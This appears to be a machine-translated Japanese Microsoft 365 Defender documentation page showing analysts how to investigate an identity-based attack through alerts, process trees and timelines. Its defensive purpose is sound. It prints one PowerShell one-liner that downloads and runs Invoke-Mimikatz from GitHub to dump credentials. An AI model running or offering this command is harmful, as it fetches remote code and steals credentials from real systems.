---
title: ID ベースの攻撃の例
description: ID ベースの攻撃の分析例を説明します。
keywords: インシデント、アラート、調査、相関関係、攻撃、コンピューター、デバイス、ユーザー、ID、メールボックス、電子メール、365、microsoft、m365、インシデント対応、サイバー攻撃
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 04/30/2021
ms.locfileid: "52114858"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="9e4b2-104">ID ベースの攻撃の例</span><span class="sxs-lookup"><span data-stu-id="9e4b2-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="9e4b2-105">**適用対象:**</span><span class="sxs-lookup"><span data-stu-id="9e4b2-105">**Applies to:**</span></span>
- <span data-ttu-id="9e4b2-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="9e4b2-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="9e4b2-107">Microsoft Defender for Identity は、組織内の ID を侵害する悪意のある試みを検出するのに役立ちます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="9e4b2-108">Defender for Identity は Microsoft 365 Defender と統合されます。セキュリティ アナリストは、Netlogon 特権昇格の疑いなど、Defender for Identity から入ってくる脅威を可視化できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="9e4b2-109">Microsoft Defender for Identity での攻撃の分析</span><span class="sxs-lookup"><span data-stu-id="9e4b2-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="9e4b2-110">Microsoft 365Defender を使用すると、アナリストはインシデント ページの[アラート] タブで検出ソースによってアラートをフィルター処理できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="9e4b2-111">次の例では、検出ソースは Defender for **Identity にフィルター処理されます**。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Defender for Identity の検出ソースをフィルター処理する例":::

<span data-ttu-id="9e4b2-113">[疑わしいオーバーパス **-the ハッシュ** 攻撃] アラートを選択すると、詳細な情報を表示する Microsoft Cloud App Securityページに移動します。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="9e4b2-114">[このアラートの種類の詳細] を選択して、攻撃の説明と修復の提案を読み[](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)取り、アラートや攻撃の詳細をいつでも確認できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="疑わしいオーバーパスのハッシュ攻撃アラートの例"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="9e4b2-116">エンドポイント向け Microsoft Defender で同じ攻撃を調査する</span><span class="sxs-lookup"><span data-stu-id="9e4b2-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="9e4b2-117">または、分析者は Defender for Endpoint を使用して、エンドポイントでのアクティビティの詳細を確認できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="9e4b2-118">インシデント キューからインシデントを選択し、[アラート] タブ **を選択** します。ここから、検出ソースも識別できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="9e4b2-119">[エンドポイントの検出と応答] EDR検出ソースは、Defender for Endpoint です。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="9e4b2-120">ここから、アナリストはユーザーが検出したアラートをEDR。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Defender for Endpoint でのエンドポイント検出と応答の例"::: 

<span data-ttu-id="9e4b2-122">アラート ページには、影響を受けたデバイス名、ユーザー名、自動調査の状態、アラートの詳細など、さまざまな関連情報が表示されます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="9e4b2-123">アラート ストーリーは、プロセス ツリーの視覚的な表現を示しています。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="9e4b2-124">プロセス ツリーは、アラートに関連する親プロセスと子プロセスの階層的な表現です。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Defender for Endpoint のアラート プロセス ツリーの例"::: 

<span data-ttu-id="9e4b2-126">各プロセスを展開して、追加の詳細を表示できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="9e4b2-127">アナリストに表示される詳細は、悪意のあるスクリプト、送信接続 IP アドレス、その他の有用な情報の一部として入力された実際のコマンドです。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Defender for Endpoint のプロセスの詳細の例":::
 
<span data-ttu-id="9e4b2-129">[タイムラインで **表示] を選択** すると、アナリストはさらにドリルダウンして、侵害の正確な時刻を判断できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="9e4b2-130">Microsoft Defender for Endpoint では、多くの悪意のあるファイルとスクリプトを検出できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="9e4b2-131">ただし、送信接続、PowerShell、およびコマンド ライン アクティビティの正当な使用が多いため、悪意のあるファイルまたはアクティビティが作成されるまで、一部のアクティビティは良性と見なされます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="9e4b2-132">そのため、タイムラインを使用すると、アナリストはアラートを周囲のアクティビティと関連付け、一般的なファイル システムとユーザー アクティビティによって見えなされない攻撃の元のソースまたは時間を特定できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="9e4b2-133">これを行うには、アナリストはアラート検出時 (赤色) から開始し、悪意のあるアクティビティに導かれた元のアクティビティが実際に開始された時期を判断するために、時間内に後方にスクロールします。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="アラート検出時の開始例"::: 

<span data-ttu-id="9e4b2-135">Windows Update 接続、Windows 信頼できるソフトウェアライセンス認証トラフィック、Microsoft サイトへのその他の一般的な接続、サードパーティのインターネットアクティビティ、Microsoft Endpoint Configuration Manager アクティビティ、その他の良性アクティビティなどの一般的なアクティビティを疑わしいアクティビティと理解し、区別することが重要です。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="9e4b2-136">これを実現する 1 つの方法は、タイムライン フィルターを使用する方法です。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="9e4b2-137">アナリストが表示したくない項目をフィルター処理しながら、特定のアクティビティを強調表示できるフィルターが多数存在します。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="9e4b2-138">次の図では、アナリストがフィルター処理して、ネットワーク イベントとプロセス イベントのみを表示しました。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="9e4b2-139">これにより、アナリストは、メモ帳が IP アドレスとの接続を確立したイベントを取り巻くネットワーク接続とプロセスを確認できます。これは、プロセス ツリーでも見ていました。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="悪意のある送信メモ帳接続を確立する方法の例"::: 

<span data-ttu-id="9e4b2-141">この特定のイベントでは、悪意メモ帳送信接続を確立するために使用されたイベントです。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="9e4b2-142">ただし、通常、攻撃者は iexplorer.exe を使用して悪意のあるペイロードをダウンロードする接続を確立します。通常、iexplorer.exeプロセスは通常の Web ブラウザーアクティビティと見なされます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="9e4b2-143">タイムラインで探すもう 1 つの項目は、PowerShell が送信接続に使用する場合です。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="9e4b2-144">アナリストは、悪意のあるファイルをホストする Web サイトへの送信接続などのコマンドを使用して、PowerShell 接続の成功 `IEX (New-Object Net.Webclient)` を探します。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="9e4b2-145">次の例では、PowerShell を使用して Web サイトから Mimikatz をダウンロードして実行しました。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="9e4b2-146">アナリストは、検索バーにキーワードを入力して、PowerShell で作成されたイベントのみを表示することで、キーワードをすばやく検索できます。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="9e4b2-147">次の手順</span><span class="sxs-lookup"><span data-stu-id="9e4b2-147">Next step</span></span>

<span data-ttu-id="9e4b2-148">フィッシング調査 [パスを](first-incident-path-phishing.md) 参照してください。</span><span class="sxs-lookup"><span data-stu-id="9e4b2-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="9e4b2-149">関連項目</span><span class="sxs-lookup"><span data-stu-id="9e4b2-149">See also</span></span>

- [<span data-ttu-id="9e4b2-150">インシデントの概要</span><span class="sxs-lookup"><span data-stu-id="9e4b2-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="9e4b2-151">インシデントの管理</span><span class="sxs-lookup"><span data-stu-id="9e4b2-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="9e4b2-152">インシデントを分析する</span><span class="sxs-lookup"><span data-stu-id="9e4b2-152">Analyze incidents</span></span>](investigate-incidents.md)
